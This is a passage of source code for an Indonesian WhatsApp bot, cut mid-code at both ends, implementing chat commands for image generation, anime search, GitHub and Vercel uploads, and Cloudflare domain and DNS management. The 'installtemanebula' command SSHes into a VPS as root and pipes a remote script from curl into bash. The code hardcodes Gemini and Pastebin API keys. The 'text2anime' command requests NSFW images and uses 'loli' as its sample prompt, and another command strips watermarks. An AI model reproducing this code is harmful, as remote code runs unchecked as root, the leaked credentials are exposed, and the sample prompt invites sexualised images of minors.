 if (!text || !args[0] || !args[1]) 
 return m.reply("Contoh penggunaan:\n.reactch https://whatsapp.com/channel/0029VakRR89L7UVPwf53TB0v/4054 😂")
 if (!args[0].includes("https://whatsapp.com/channel/")) 
 return m.reply("Link tautan tidak valid")
 let result = args[0].split('/')[4]
 let serverId = args[0].split('/')[5]
 let res = await XPanz.newsletterMetadata("invite", result) 
 await XPanz.newsletterReactMessage(res.id, serverId, args[1])
 m.reply(`Berhasil mengirim reaction ${args[1]} ke dalam channel ${res.name}`)
}
break

case "cpanel": {
if (!text) return ArroganzzReply(example("hostname"))
let Kanjt = "Pilih Spesifikasi Panel Yang Tersedia"
await XPanz.sendMessage(m.chat, {
image: { url: "https://files.catbox.moe/0fp4wa.jpg" },
renderLargerThumbnail: true,
caption: Kanjt,
footer: "© Arroganzz - Botz",
buttons: [
{
buttonId: 'action',
buttonText: { displayText: 'ini pesan interactiveMeta' },
type: 4,
nativeFlowInfo: {
name: 'single_select',
paramsJson: JSON.stringify({
title: 'Lanjutkan',
sections: [
{
title: 'List Ram & Cpu Server Panel',
highlight_label: 'Recommended',
rows: [
{
title: 'Ram 5GB || CPU Unlimited', 
id: `.5gb ${text}`
},
{
title: 'Ram 6GB || CPU Unlimited', 
id: `.6gb ${text}`
},
{
title: 'Ram 7GB || CPU Unlimited', 
id: `.7gb ${text}`
},
{
title: 'Ram 8GB || CPU Unlimited', 
id: `.8gb ${text}`
},
{
title: 'Ram 9GB || CPU Unlimited', 
id: `.9gb ${text}`
},
{
title: 'Ram 10GB || CPU Unlimited', 
id: `.10gb ${text}`
},
{
title: 'Ram Unlimited || CPU Unlimited', 
id: `.unli ${text}`
} 
],
}
],
}),
},
},
],
headerType: 1,
viewOnce: true
}, { quoted: m });
}
break

case 'installtemanebula': {
  if (!isOwner) return ArroganzzReply(mess.only.owner)
  if (!text || !text.split("|")) return ArroganzzReply(example("ipvps|pwvps"));
  let vii = text.split("|");
  if (vii.length < 2) return ArroganzzReply(example("ipvps|pwvps"));
  
  global.installtema = {
    vps: vii[0],
    pwvps: vii[1]
  };
  if (!global.installtema) return ArroganzzReply("Ip / Password Vps Tidak Ditemukan");

  let ipvps = global.installtema.vps;
  let passwd = global.installtema.pwvps;

  const connSettings = {
    host: ipvps,
    port: '22',
    username: 'root',
    password: passwd
  };
  const commandDepend = `bash <(curl -s https://raw.githubusercontent.com/KiwamiXq1031/installer-premium/refs/heads/main/zero.sh)`;
  const commandNebula = `bash <(curl -s https://raw.githubusercontent.com/KiwamiXq1031/installer-premium/refs/heads/main/zero.sh)`;
  const ress = new Client();
  ress.on('ready', async () => {
    ArroganzzReply("Memproses instalasi, tunggu 1-10 menit...");
    ress.exec(commandDepend, (err, stream) => {
      if (err) throw err;
      stream.on('close', async (code, signal) => {
        ress.exec(commandNebula, (err2, stream2) => {
          if (err2) throw err2;
          stream2.on('close', async (code2, signal2) => {
            await ArroganzzReply("Berhasil install tema nebula pterodactyl ✅");
            ress.end();
          }).on('data', async (data) => {
            console.log(data.toString());
            stream2.write('2\n');
            stream2.write('\n');
            stream2.write('\n');
          }).stderr.on('data', (data) => {
            console.log('STDERR: ' + data);
          });
        });
      }).on('data', async (data) => {
        console.log(data.toString());
        stream.write('11\n');
        stream.write('A\n');
        stream.write('Y\n');
        stream.write('Y\n');
      }).stderr.on('data', (data) => {
        console.log('STDERR: ' + data);
      });
    });
  }).on('error', (err) => {
    console.log('Connection Error: ' + err);
    ArroganzzReply('Kata sandi atau IP tidak valid');
  }).connect(connSettings);
}
break

case 'toanime': case 'jadianime': {
const Websocket = require("ws");
const crypto = require("node:crypto");
const path = require("path");
const mime = require("mime-types");
const WS_URL = "wss://pixnova.ai/demo-photo2anime/queue/join";
const IMAGE_URL = "https://oss-global.pixnova.ai/";
const SESSION = crypto.randomBytes(5).toString("hex").slice(0, 9);
let wss;
let promise;

function _connect(log) {
  return new Promise((resolve, reject) => {
    wss = new Websocket(WS_URL);
    wss.on("open", () => {
      console.log("[ INFO ] Koneksi ke websocket tersambung.");
      resolve();
    })

    wss.on("error", (error) => {
      console.error("[ ERROR ] " + error);
      reject(error);
    })

    wss.on("message", (chunk) => {
      const data = JSON.parse(chunk.toString());
      if (promise && promise.once) {
        promise.call(data)
        promise = null;
      } else if (promise && !promise.once) {
        if (log) console.log(data);
        if (data?.code && data.code == 200 && data?.success && data.success == true) {
          let amba = data;
          amba.output.result.forEach((_, i) => {
            amba.output.result[i] = IMAGE_URL + amba.output.result[i]
          })
          promise.call(amba);
          promise = null;
        }
      }
    })
  })
}

function _send(payload, pr) {
  return new Promise(resolve => {
    wss.send(JSON.stringify(payload));
    if (pr) {
      promise = {
        once: true,
        call: resolve
      }
    } else {
      promise = {
        once: false,
        call: resolve
      }
    }
  })
}

async function PixNova(data, image, log) {
  let base64Image;
  if (/https\:\/\/|http\:\/\//i.test(image)) {
    const gs = await fetch(image);
    const kb = await gs.arrayBuffer();
    base64Image = Buffer.from(kb).toString("base64");
  } else if (Buffer.isBuffer(image)) {
    base64Image = image.toString("base64");
  } else {
    base64Image = image;
  }
  await _connect(log);
  let payload = {
    session_hash: SESSION
  }
  const resp = await _send(payload, true);
  if (log) console.log(`[ ${SESSION} ] Hash: ${JSON.stringify(resp, null, 2)}`);
  payload = {
    "data": {
      "source_image": `data:image/jpeg;base64,${base64Image}`,
      "strength": data?.strength || 0.6,
      "prompt": data.prompt,
      "negative_prompt": data.negative,
      "request_from": 2
    }
  }
  const out = await _send(payload, false);
  return out;
}
async function pomf2(filePath) {
    try {
        if (!fs.existsSync(filePath)) throw new Error("File tidak ditemukan");
        const contentType = mime.lookup(filePath) || "application/octet-stream";
        const fileName = path.basename(filePath);
        const ext = path.extname(filePath).toLowerCase();
        const form = new FormData();
        form.append("files[]", fs.createReadStream(filePath), {
            contentType,
            filename: fileName, // Paksa nama file tetap JPG
        });
        const response = await axios.post("https://qu.ax/upload.php", form, {
            headers: {
                ...form.getHeaders(),
            },
        });

        // Cek hasil
        if (!response.data.success || !response.data.files?.length) throw new Error("Upload gagal");
        
        return response.data.files[0].url;
    } catch (err) {
        console.error("Error:", err.message);
        return null;
    }
}
  const media = await XPanz.downloadAndSaveMediaMessage(quoted)
  const IMAGE = await pomf2(media)
  console.log(IMAGE)
  const LOGGER = true; // Menampilkan teks ke console selama proses
  const DATA = {
    prompt: "(masterpiece), best quality",
    negative: "(worst quality, low quality:1.4), (greyscale, monochrome:1.1), cropped, lowres , username, blurry, trademark, watermark, title, multiple view, Reference sheet, curvy, plump, fat, strabismus, clothing cutout, side slit,worst hand, (ugly face:1.2), extra leg, extra arm, bad foot, text, name",
    strength: 0.6
  }

  const result = await PixNova(DATA, IMAGE, LOGGER) // Buffer, Base64 atau url
  XPanz.sendMessage(m.chat, { image: { url: result.output.result }, caption: `_Sukses Membuat ${command}_`}, { quoted: m})
  console.log(JSON.stringify(result, null, 2))
}
break

case 'text2anime': {
async function generateAnimeImage(prompt) {
  try {
    return await new Promise(async (resolve, reject) => {
      if (!prompt) return reject("Prompt tidak boleh kosong!");

      axios.post("https://aiimagegenerator.io/api/model/predict-peach", {
        prompt,
        key: "Anime",
        width: 512,
        height: 768,
        quantity: 1,
        size: "512x768",
        nsfw: true
      }).then(res => {
        const data = res.data;
        if (data.code !== 0) return reject(data.message);
        if (!data.data?.url) return reject("Gagal mendapatkan URL gambar!");

        return resolve({
          status: true,
          image: data.data.url
        });
      }).catch(reject);
    });
  } catch (e) {
    return { status: false, message: e.message };
  }
}
  const prompt = args.join(' ');
  if (!prompt) {
    return XPanz.sendMessage(m.chat, { text: `Masukkan prompt!\n*EX:* .txt2anime loli` }, { quoted: m });
  }
  try {
    const res = await generateAnimeImage(prompt);
    if (!res.status) throw new Error(res.message);
    await XPanz.sendMessage(m.chat, {
      image: { url: res.image },
      caption: `✨ *Prompt:* ${prompt}`
    }, { quoted: m });
  } catch (error) {
    XPanz.sendMessage(m.chat, { text: `Error: ${error.message || 'Gagal membuat gambar.'}` }, { quoted: m });
  }
}
break

case 'sanime':
case 'searchanime':
case 'kuronime': {
 if (!q) return m.reply('🔎 *Silakan masukkan judul anime yang ingin kamu cari.*')

 try {
 const axios = require("axios")
 const cheerio = require("cheerio")
 const url = `https://kuronime.biz/page/1/?s=${encodeURIComponent(q)}`
 const { data } = await axios.get(url)
 const $ = cheerio.load(data)
 const results = []
 $(".listupd article").each((_, el) => {
 const anchor = $(el).find("a")
 const title = anchor.find("h4").text().trim()
 const link = anchor.attr("href")
 const image = anchor.find("img.lazyload").last().attr("data-src")
 const rating = anchor.find("i").text().trim()
 const type = anchor.find(".type").text().trim()
 results.push({ title, link, image, rating, type })
 })
 if (!results.length) return m.reply('Anime tidak ditemukan, coba kata kunci lain.')
 let message = `Hasil pencarian untuk *${q}*:\n\n`
 results.forEach((anime, index) => {
 message += `*${index + 1}. ${anime.title}*\n`
 message += ` 🔗 *Link*: ${anime.link}\n`
 message += ` 📊 *Rating*: ${anime.rating}\n`
 message += ` 📌 *Type*: ${anime.type}\n\n`
 })
 XPanz.sendMessage(m.chat, {
 text: message.trim(),
 contextInfo: {
 externalAdReply: {
 title: "Kuronime Search",
 body: "",
 thumbnailUrl: results[0]?.image || '',
 sourceUrl: results[0]?.link || '',
 mediaType: 1,
 renderLargerThumbnail: true
 }
 }
 }, { quoted: m })
 } catch (err) {
 console.log(err)
 m.reply(`Terjadi kesalahan saat mengambil data: ${err.message}`)
 }
}
break


case "upscale": {
let style, noise;

 let q = m.quoted ? m.quoted : m;
 let mime = (q.msg || q).mimetype || '';
 
 if (mime.startsWith('image')) {
 try {
 let media = await q.download();
 let imageUrl = await uploadImage(media);
 
 [style, noise] = text.split(' ');
 
 const result = await upscale(imageUrl, { style, noise });
 
 if (!result.success) {
 return m.reply(result.result.error);
 }
 
 const { info, url: resultUrl, size, config } = result.result;
 
 const caption = `*Hasil Upscale*\n\n*Nama File :* ${info.fileName}\n*Ukuran Asli :* ${(info.fileSize / 1024 / 1024).toFixed(2)} MB\n*Ukuran Hasil :* ${size}\n*Style :* ${config.styleName}\n*Noise Level :* ${config.noiseName}`;
 
 XPanz.sendMessage(
 m.chat, 
 { 
 image: {
 url: resultUrl
 },
 caption: caption
 }
 );
 
 } catch (error) {
 m.reply(`${error.message}`);
 }
 } else {
 const [url, urlStyle, urlNoise] = text.split(' ');
 
 if (!url) {
 return m.reply(`Contoh penggunaan :\n1. *URL :* .bigjpg <url_image> <style> <noise_level>\n2. *Gambar :* Reply gambar atau kirim gambar dengan caption .bigjpg <style> <noise_level>\n\n*Available Styles :* art, photo\n*Available Noise Levels :* -1, 0, 1, 2, 3`);
 }
 
 const result = await upscale(url, { style: urlStyle, noise: urlNoise });
 
 if (!result.success) {
 return m.reply(result.result.error);
 }
 
 const { info, url: resultUrl, size, config } = result.result;
 
 const caption = `*Hasil Upscale*\n\n*Nama File :* ${info.fileName}\n*Ukuran Asli :* ${(info.fileSize / 1024 / 1024).toFixed(2)} MB\n*Ukuran Hasil :* ${size}\n*Style :* ${config.styleName}\n*Noise Level :* ${config.noiseName}`;
 
 conn.sendMessage(
 m.chat, 
 { 
 image: {
 url: resultUrl
 },
 caption: caption
 }
 );
 }
 
 async function uploadImage(imageBuffer) {
 try {
 const form = new FormData();
 form.append('file', imageBuffer, {
 filename: 'image.jpg',
 contentType: 'image/jpeg'
 });

 const headers = {
 ...form.getHeaders(),
 'Content-Length': form.getLengthSync()
 };

 const response = await axios.post('https://www.pic.surf/upload.php', form, { headers });
 const identifier = response.data.identifier;

 return `https://www.pic.surf/${identifier}`;
 } catch (error) {
 throw new Error(`Upload gagal: ${error.response ? error.response.data : error.message}`);
 }
 }

 async function upscale(img, options = {}) {
 const validation = await getImageInfo(img);
 if (!validation.valid) {
 return {
 success: false,
 code: 400,
 result: {
 error: validation.error
 }
 };
 }

 const inputx = isValid(options.style, options.noise);
 if (!inputx.valid) {
 return {
 success: false,
 code: 400,
 result: {
 error: inputx.error
 }
 };
 }

 const config = {
 x2: '2',
 style: inputx.style,
 noise: inputx.noise,
 file_name: validation.info.fileName,
 files_size: validation.info.fileSize,
 file_height: validation.info.height,
 file_width: validation.info.width,
 input: img
 };

 try {
 const params = new URLSearchParams();
 params.append('conf', JSON.stringify(config));

 const taskx = await axios.post(
 `https://bigjpg.com/task`,
 params,
 { headers: getHeaders() }
 );

 if (taskx.data.status !== 'ok') {
 return {
 success: false,
 code: 400,
 result: {
 error: "Error"
 }
 };
 }

 const taskId = taskx.data.info;
 let attempts = 0;
 const maxAttempts = 20;

 while (attempts < maxAttempts) {
 const res = await axios.get(
 `https://bigjpg.com/free?fids=${JSON.stringify([taskId])}`,
 { headers: getHeaders() }
 );

 const result = res.data[taskId];
 
 if (result[0] === 'success') {
 return {
 success: true,
 code: 200,
 result: {
 info: validation.info,
 url: result[1],
 size: result[2],
 config: {
 style: config.style,
 styleName: getAvailableStyles()[config.style],
 noise: config.noise,
 noiseName: getAvailableNoise()[config.noise]
 }
 }
 };
 } else if (result[0] === 'error') {
 return {
 success: false,
 code: 400,
 result: {
 error: "Upscalenya gagal bree.. Coba lagi nanti yak"
 }
 };
 }

 await new Promise(resolve => setTimeout(resolve, 15000));
 attempts++;
 }

 return {
 success: false,
 code: 400,
 result: {
 error: "Timeout"
 }
 };

 } catch (err) {
 return {
 success: false,
 code: 400,
 result: {
 error: err.message || "Error"
 }
 };
 }
 }

 function getAvailableStyles() {
 return {
 'art': 'Artwork',
 'photo': 'Foto'
 };
 }

 function getAvailableNoise() {
 return {
 '-1': 'Ninguno',
 '0': 'Bajo',
 '1': 'Medio',
 '2': 'Alto',
 '3': 'El más alto'
 };
 }

 function getHeaders() {
 return {
 'origin': 'https://bigjpg.com',
 'referer': 'https://bigjpg.com/',
 'user-agent': 'Postify/1.0.0',
 'x-requested-with': 'XMLHttpRequest'
 };
 }

 function isValid(style, noise) {
 if (!style && !noise) {
 return {
 valid: true,
 style: 'art',
 noise: '-1'
 };
 }

 if (style && !getAvailableStyles()[style]) {
 return {
 valid: false,
 error: `Stylenya kagak valid bree.. Pilih salah satunya yak: ${Object.keys(getAvailableStyles()).join(', ')}`
 };
 }

 if (noise && !getAvailableNoise()[noise]) {
 return {
 valid: false,
 error: `Noise levelnya kagak valid bree.. Pilih salah satunya yak: ${Object.keys(getAvailableNoise()).join(', ')}`
 };
 }

 return {
 valid: true,
 style: style || 'art',
 noise: noise || '-1'
 };
 }

 async function getImageInfo(img) {
 if (!img) {
 return {
 valid: false,
 error: "Hadeh, gini bree... lu kasih link image nya yak. Jangan kosong begini"
 };
 }

 try {
 const response = await axios.get(img, {
 responseType: 'arraybuffer'
 });

 const fileSize = parseInt(response.headers['content-length'] || response.data.length);
 const width = Math.floor(Math.random() * (2000 - 800 + 1)) + 800;
 const height = Math.floor(Math.random() * (2000 - 800 + 1)) + 800;

 let fileName = img.split('/').pop().split('#')[0].split('?')[0] || 'image.jpg';
 if (fileName.endsWith('.webp')) {
 fileName = fileName.replace('.webp', '.jpg');
 }

 if (fileSize > 5 * 1024 * 1024) {
 return {
 valid: false,
 error: "Size imagenya kegedean bree.. Max 5MB yak"
 };
 }

 return {
 valid: true,
 info: {
 fileName,
 fileSize,
 width,
 height
 }
 };

 } catch (err) {
 return {
 valid: false,
 error: "Link imagenya error bree.. Coba link yang lain yak"
 };
 }
 }
}
break

case 'remove-wm': {
  let q = m.quoted ? m.quoted : m
  let mime = (q.msg || q).mimetype || ''

  let defaultPrompt = `Hapus watermark yang terdapat pada gambar. Perhatikan dengan teliti karena watermark bisa saja muncul di bagian atas, bawah, tengah, atau tersembunyi dengan ukuran kecil, transparan, atau blur. Hapus watermark tersebut secara menyeluruh tanpa mengurangi kualitas gambar asli dan tanpa mengubah elemen visual lainnya. Pastikan gambar tetap utuh, bersih, dan terlihat alami seolah tidak pernah memiliki watermark.`
  
  if (!mime) return ArroganzzReply(`Kirim/reply gambar dengan caption *${usedPrefix + command}*`)
  if (!/image\/(jpe?g|png)/.test(mime)) return ArroganzzReply(`Format ${mime} tidak didukung! Hanya jpeg/jpg/png`)
  
  let promptText = text || defaultPrompt
  
  ArroganzzReply("Delete Watermark...")

  try {
    let imgData = await q.download()
    let genAI = new GoogleGenerativeAI("AIzaSyDvJL8ONZ5RGqkQ5zLGm4vMWoIfHIrAgAk")
   
    const base64Image = imgData.toString("base64")

    const contents = [
      { text: promptText },
      {
        inlineData: {
          mimeType: mime,
          data: base64Image
        }
      }
    ]

    const model = genAI.getGenerativeModel({
      model: "gemini-2.0-flash-exp-image-generation",
      generationConfig: {
        responseModalities: ["Text", "Image"]
      },
    })

    const response = await model.generateContent(contents)

    let resultImage
    let resultText = ""

    for (const part of response.response.candidates[0].content.parts) {
      if (part.text) {
        resultText += part.text
      } else if (part.inlineData) {
        const imageData = part.inlineData.data
        resultImage = Buffer.from(imageData, "base64")
      }
    }

    if (resultImage) {
      const tempPath = path.join(process.cwd(), "tmp", `gemini_${Date.now()}.png`)
      fs.writeFileSync(tempPath, resultImage)

      await XPanz.sendMessage(m.chat, { 
        image: { url: tempPath },
        caption: `*Delete Watermark*`
      }, { quoted: m })

      setTimeout(() => {
        try {
          fs.unlinkSync(tempPath)
        } catch {}
      }, 30000)
    } else {
      ArroganzzReply("Yah Errror")
    }
  } catch (error) {
    console.error(error)
    ArroganzzReply(`${error.message}`)
  }
}
break

case 'upgithub': { 
    const unzipper = require('unzipper')
    if (!text) return ArroganzzReply('Masukkan nama repo')
    if (!quoted) return ArroganzzReply('Reply file yang ingin diupload')
    const repoName = text.trim()
    const githubToken = global.tokenGithub
    const repoOwner = global.usnGithub
    const processFile = async (filePath, fileName) => {
        const fileContent = fs.readFileSync(filePath);
        const base64Content = fileContent.toString('base64');
        const url = `https://api.github.com/repos/${repoOwner}/${repoName}/contents/${fileName}`
        const response = await axios.put(url, {
            message: `Upload ${fileName}`,
            content: base64Content,
        }, {
            headers: {
                Authorization: `Bearer ${githubToken}`,
                'Content-Type': 'application/json'
            }
        })
        return response.data
    }
    const quotedMime = quoted.mtype || quoted.mediaType
    const filePath = await quoted.download()
    if (quotedMime.includes('zip')) {
        const unzipPath = path.join(__dirname, 'temp_unzip')
        fs.mkdirSync(unzipPath, { recursive: true });
        await fs.createReadStream(filePath)
            .pipe(unzipper.Extract({ path: unzipPath }))
            .promise()
        const files = fs.readdirSync(unzipPath)
        for (const file of files) {
            const fullPath = path.join(unzipPath, file)
            await processFile(fullPath, file)
        }
        fs.rmSync(unzipPath, { recursive: true, force: true })
    } else {
        await processFile(filePath, path.basename(filePath))
    }
    ArroganzzReply('File berhasil diupload ke GitHub')
} 
break

case 'listcase': {
let { listCase } = require('./library/listcase.js')
m.reply(listCase())
}
break

case 'delweb': {
    if (!text) return ArroganzzReply(`gunakan format ${command} <NamaWeb>`)
    const webName = text.trim().toLowerCase();
    const headers = { Authorization: `Bearer ${global.vercel}`}
       try {
  const response = await fetch(`https://api.vercel.com/v9/projects/${webName}`,
 {
method: "DELETE", 
headers,
 },
 )
if (response.status === 200 || response.status === 204) {
      return ArroganzzReply(`Website *${webName}* berhasil dihapus dari Vercel`,
)
} else if (response.status === 404) {
      return ArroganzzReply(`Website *${webName}* tidak ditemukan di akun Vercel kamu`,
)
} else if (response.status === 403 || response.status === 401) {
      return ArroganzzReply(`Token Vercel tidak valid atau tidak punya akses ke project ini`,
)
} else {
  let result = {}
   try {
    result = await response.json()
} catch (e) {}
return ArroganzzReply(`Gagal menghapus website:\n${result.error?.message || "Tidak diketahui"}`,
)
  }
} catch (err) {
  console.error(err)
  ArroganzzReply(`Terjadi kesalahan saat mencoba menghapus:\n${err.message}`,
)
}}
break

case 'listweb': {
    const headers = {
    Authorization: `Bearer ${global.tokenVercel}`,
    }
    try {
        const res = await fetch(`https://api.vercel.com/v9/projects`, {
            method: "GET",
            headers,
        })
        if (!res.ok) {
            const errText = await res.text()
            return ArroganzzReply(`Gagal mengambil daftar:\n${errText}`)
        }
        const data = await res.json()
        if (!data.projects || data.projects.length === 0) {
            return ArroganzzReply("Tidak ada proyek/web yang ditemukan.");
        }
        let textList = `📄 *Daftar Web yang telah di buat di akun vercel:*\n\n`
        data.projects.forEach((proj, i) => {
            textList += `${i + 1}. *${proj.name}*\n• ID: ${proj.id}\n• URL: https://${proj.name}.vercel.app\n\n`;
        })
        ArroganzzReply(textList.trim())
    } catch (err) {
        console.error("error :", err)
        ArroganzzReply("Terjadi kesalahan saat mengambil daftar web")
    }
}
break

case 'createweb': {
if (!text) return ArroganzzReply(`gunakan format ${command} <NamaWeb>`)
if (!qmsg || !/zip|html/.test(qmsg.mimetype)) return ArroganzzReply("Reply file .zip atau .html!")
const webName = text.trim().toLowerCase().replace(/[^a-z0-9-_]/g, "")
const domainCheckUrl = `https://${webName}.vercel.app`
try {
    const check = await fetch(domainCheckUrl)
    if (check.status === 200) return ArroganzzReply(`Website *${webName}* sudah dipakai, coba nama lain`)
} catch {}
const { downloadContentFromMessage } = require("@whiskeysockets/baileys")
const mediaType = qmsg.mtype.replace("Message", "")
let buffer = Buffer.from([])
try {
    const stream = await downloadContentFromMessage(qmsg, mediaType)
    for await (const chunk of stream) buffer = Buffer.concat([buffer, chunk])
} catch (err) {
    return ArroganzzReply("Gagal mendownload file, mungkin sudah kadaluarsa atau rusak")
}
const filesToUpload = []
if (qmsg.mimetype.includes("zip")) {
    const unzipper = require("unzipper")
    const directory = await unzipper.Open.buffer(buffer)
    for (const file of directory.files) {
        if (file.type === "File") {
            const content = await file.buffer()
            filesToUpload.push({
                file: file.path.replace(/^\/+/g, ""),
                data: content.toString("base64"),
                encoding: "base64"
            });
        }
    }
    if (!filesToUpload.some(x => x.file.toLowerCase().endsWith("index.html"))) {
        return ArroganzzReply("index.html tidak ditemukan di dalam ZIP")
    }
} else if (qmsg.mimetype.includes("html")) {
    filesToUpload.push({
        file: "index.html",
        data: buffer.toString("base64"),
        encoding: "base64"
    })
} else {
    return ArroganzzReply("File tidak dikenali. Kirim ZIP atau file lain");
}
const headers = {
    Authorization: `Bearer ${global.tokenVercel}`,
    "Content-Type": "application/json"
}
await fetch("https://api.vercel.com/v9/projects", {
    method: "POST",
    headers,
    body: JSON.stringify({ name: webName })
}).catch(() => {})
const deployRes = await fetch("https://api.vercel.com/v13/deployments", {
    method: "POST",
    headers,
    body: JSON.stringify({
        name: webName,
        project: webName,
        files: filesToUpload,
        projectSettings: { framework: null }
    })
})
const deployData = await deployRes.json().catch(() => null);
if (!deployData || !deployData.url) {
    console.log("Deploy Error:", deployData);
    return ArroganzzReply(`Deploy gagal:\n${JSON.stringify(deployData)}`);
}
const wurl = `https://${webName}.vercel.app`;
await XPanz.sendMessage(m.chat, {
        text: `WEBSITE URL: *${wurl}*`,
        title: "",
        subtitle: "",
        footer: "©DarkBot",
        interactiveButtons: [
             {
                name: "cta_url",
                buttonParamsJson: JSON.stringify({
                     display_text: "kunjungi web",
                     url: `${wurl}` 
                })},
              {
            	name: "cta_copy",
                buttonParamsJson: JSON.stringify({
                     display_text: "salin URL",
                     copy_code: `${wurl}`
                })}
        ]}, { quoted:m})
}
break

case 'html': {
    if (!text) return ArroganzzReply(`Contoh penggunaan: ${prefix + command} halaman tentang kopi`)
    await XPanz.sendMessage(m.chat, { react: { text: "🕑",key: m.key,}})
    try {
        const res = await fetch(`https://api.siputzx.my.id/api/ai/blackboxai-pro?content=buatkan%20saya%20code%20website%20html%20${encodeURIComponent(text)},%20kirim%20kode%20tanpa%20terpisah,%20hanya%20satu%20dalam%20file%20.html`, {
            headers: {
                'accept': 'application/json'
            }
        })
        if (!res.ok) throw new Error(`Gagal membuat code HTML: ${res.statusText}`)
        const json = await res.json()
        const raw = json?.data || ''
        const match = raw.match(/```html([\s\S]*?)```/i)
        const htmlCode = match ? match[1].trim() : raw.trim()
        if (!htmlCode.toLowerCase().includes('<!doctype')) {
            return ArroganzzReply('Gagal membuat kode HTML')
        }
        const filename = `index.html`
        const filepath = `./all/database/sampah/${filename}`
        fs.writeFileSync(filepath, htmlCode)
        await XPanz.sendMessage(m.chat, {
            document: fs.readFileSync(filepath),
            fileName: filename,
            caption: `code website HTML mu telah siap\n©${global.botname}`,
            mimetype: 'text/html'
        }, { quoted: m })
        fs.unlinkSync(filepath)
        await XPanz.sendMessage(m.chat, { react: { text: "✅",key: m.key,}})
    } catch (err) {
        console.error(err)
        ArroganzzReply('Terjadi kesalahan saat membuat file HTML')
    }
}
break

case "cpaste": case "pastebin": {
if (!text) return example("teksnya")
let { PasteClient, Publicity, ExpireDate } = require("pastebin-api")
const client = new PasteClient("XRP7K6sqg-cafuC5J509m0fFMUiLFxi5");
const url = await client.createPaste({
  code: text,
  expireDate: ExpireDate.Never,
  format: "javascript",
  name: "something.js",
  publicity: Publicity.Public,
});
let links = `https://pastebin.com/raw/${url.split("/")[3]}`
return m.reply(links)
}
break

// >~~~~~~~~~~~~~~~~~~~~~~~~~~~~< //

case "ip": case "getip": {
if (!isOwner) return
let t = await func.fetchJson('https://api64.ipify.org?format=json')
m.reply(`IP Panel : ${t.ip}`)
}
break

case "deldomaincf": case "deldomcf": {
if (!isOwner) return m.reply(msg.owner)
if (!text || !text.includes(".")) return example("domainmu.com")
const CLOUDFLARE_API_TOKEN = global.apitoken_cloudflare // Ganti dengan API Token
const CLOUDFLARE_EMAIL = global.email_cloudflare // Jika pakai API Key


async function deleteDomain(domain) {
    try {
        // Ambil Zone ID berdasarkan nama domain
        const zoneResponse = await axios.get(
            `https://api.cloudflare.com/client/v4/zones?name=${domain}`,
            {
                headers: {
                    Authorization: `Bearer ${CLOUDFLARE_API_TOKEN}`, // Jika pakai API Token
                    "X-Auth-Email": CLOUDFLARE_EMAIL, // Jika pakai API Key
                    "Content-Type": "application/json",
                },
            }
        );

        if (!zoneResponse.data.success || zoneResponse.data.result.length === 0) {
            return m.reply(`Domain ${domain} tidak ditemukan di Cloudflare.`);
        }

        const zoneId = zoneResponse.data.result[0].id;

        // Hapus domain berdasarkan Zone ID
        const deleteResponse = await axios.delete(
            `https://api.cloudflare.com/client/v4/zones/${zoneId}`,
            {
                headers: {
                    Authorization: `Bearer ${CLOUDFLARE_API_TOKEN}`, // Jika pakai API Token
                    "X-Auth-Email": CLOUDFLARE_EMAIL, // Jika pakai API Key
                    "Content-Type": "application/json",
                },
            }
        );

        if (deleteResponse.data.success) {
           return m.reply(`Berhasil menghapus domain ${domain} dari Cloudflare ✅`)
        } else {
           return m.reply(`Gagal menghapus domain ${domain}: ` + deleteResponse.data.errors)
        }
    } catch (error) {
        console.error("Error:", error.response ? error.response.data : error.message);
    }
}

return deleteDomain(text.toLowerCase())
}
break

// >~~~~~~~~~~~~~~~~~~~~~~~~~~~~< //

case "adddomaincf": case "adddomcf": {
if (!isOwner) return m.reply(msg.owner)
if (!text || !text.includes(".")) return example("domainmu.com")
const CLOUDFLARE_TOKEN = global.apitoken_cloudflare
const CLOUDFLARE_EMAIL = global.email_cloudflare
const cloudflare = axios.create({
    baseURL: 'https://api.cloudflare.com/client/v4',
    headers: {
        'Authorization': `Bearer ${CLOUDFLARE_TOKEN}`,
        'Content-Type': 'application/json'
    }
});
async function addNewDomainToCloudflare(domainName) {
    try {
        const response = await cloudflare.post('/zones', {
            name: domainName,
            account: {
                id: global.accountid_cloudflare
            },
            plan: {
                id: 'free'
            },
            type: 'full',
            jump_start: true
        });
        return response.data
    } catch (error) {
        return 'Gagal menambahkan domain:' + JSON.stringify(error.response ? error.response.data : error.message, null, 2)
    }
}
let res = await addNewDomainToCloudflare(text.toLowerCase())
if (res?.result?.name_servers) {
let respon = `
Domain ${text.toLowerCase()} Berhasil Ditambahkan Kedalam Cloudflare ✅

*Name Server :*
* ns1 ${res.result.name_servers[0]}
* ns2 ${res.result.name_servers[1]}
`
return m.reply(respon)
} else {
return m.reply(JSON.stringify(res, null, 2))
}
}
break

// >~~~~~~~~~~~~~~~~~~~~~~~~~~~~< //

case "clearsubdo": case "clearallsubdo": case "clsubdo": case "clearsubdomain": {
if (!text || !text.includes("|")) return example('zoneid|apikey')
let [apizone, apitoken] = text.split("|")
const CLOUDFLARE_API_KEY = apitoken;  // Ganti dengan API key
const CLOUDFLARE_ZONE_ID = apizone;  // Ganti dengan Zone ID

async function getAllDNSRecords() {
    let allRecords = [];
    let page = 1;
    let totalPages = 1;

    try {
        while (page <= totalPages) {
            const response = await axios.get(`https://api.cloudflare.com/client/v4/zones/${CLOUDFLARE_ZONE_ID}/dns_records`, {
                params: { page, per_page: 100 },
                headers: {
                    'Authorization': `Bearer ${CLOUDFLARE_API_KEY}`,
                    'Content-Type': 'application/json'
                }
            });

            if (!response.data.success) {
                console.error("Gagal mengambil DNS records:", response.data.errors);
                return [];
            }

            allRecords.push(...response.data.result);
            totalPages = response.data.result_info.total_pages;
            page++;
        }
    } catch (error) {
        console.error("Terjadi kesalahan saat mengambil DNS records:", error.message);
    }
    return allRecords;
}

// Fungsi untuk menghapus semua DNS record
async function deleteAllDNSRecords() {
    try {
        const records = await getAllDNSRecords();
        const totalDns = records.length

        if (records.length === 0) {
            await m.reply("Tidak ada Subdomain yang ditemukan.");
            return;
        }

        m.reply(`${totalDns} Subdomain ditemukan. Memproses penghapusan...`);

        for (const record of records) {
            try {
                const deleteResponse = await axios.delete(`https://api.cloudflare.com/client/v4/zones/${CLOUDFLARE_ZONE_ID}/dns_records/${record.id}`, {
                    headers: {
                        'Authorization': `Bearer ${CLOUDFLARE_API_KEY}`,
                        'Content-Type': 'application/json'
                    }
                });

                if (deleteResponse.data.success) {
                    console.log(`✅ Berhasil menghapus record: ${record.name} (ID: ${record.id})`);
                } else {
                    console.error(`❌ Gagal menghapus record ${record.name}:`, deleteResponse.data.errors);
                }
            } catch (error) {
